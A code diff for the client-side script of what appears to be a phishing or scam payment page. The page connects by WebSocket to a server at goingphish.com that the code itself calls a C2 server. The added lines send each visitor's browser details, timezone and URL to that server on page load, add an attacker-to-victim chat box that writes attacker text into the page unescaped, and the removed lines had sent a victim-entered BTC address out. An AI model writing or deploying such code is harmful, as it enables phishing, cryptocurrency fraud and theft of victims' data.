@@ -123,21 +123,29 @@
         const ws = new WebSocket("wss://goingphish.com:8765");
 
         ws.onopen = () => {
-            console.log("Connected to C2 server");
-            ws.send(JSON.stringify({ message: "client connected!" }));
+            console.log("Connected to Hacker76 C2 server");
 
-            // Send victim's browser info when they load the page
-            // let victimInfo = {
-            //     "User-Agent": navigator.userAgent,
-            //     "Language": navigator.language,
-            //     "Time": new Date().toLocaleString()
-            // };
-
-            // ws.send(JSON.stringify(victimInfo));
+            // Send victim's details
+            const victimDetails = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href
+            };
+            ws.send(JSON.stringify(victimDetails));
         };
 
         ws.onmessage = (event) => {
-            console.log("C2 Server Says:", event.data);
+            try {
+                const data = JSON.parse(event.data);
+                console.log("C2 Server Says:", data);
+
+                if (data.attacker) {
+                    document.getElementById("chat").innerHTML += `<p><strong>Hacker76:</strong> ${data.attacker}</p>`;
+                }
+            } catch (error) {
+                console.error("Invalid JSON received:", event.data);
+            }
         };
 
         ws.onerror = (error) => {
@@ -145,15 +153,16 @@
         };
 
         ws.onclose = () => {
-            console.log("C2 Connection Closed");
+            console.log("Hacker76 C2 Connection Closed");
         };
 
-        // Send Phishing Data
-        function sendPhishingData() {
-            let btcAddress = document.getElementById("btc-address").value;
-            let message = `Victim entered BTC Address: ${btcAddress}`;
-            ws.send(message);
+        // Send messages to C2 when Nathan types in the chatbox
+        function sendMessage() {
+            const input = document.getElementById("chat-input").value;
+            ws.send(input);
+            document.getElementById("chat").innerHTML += `<p><strong>You:</strong> ${input}</p>`;
         }
+
 
         // Handle Form Submission
         document.getElementById("payment-form").addEventListener("submit", function (event) {
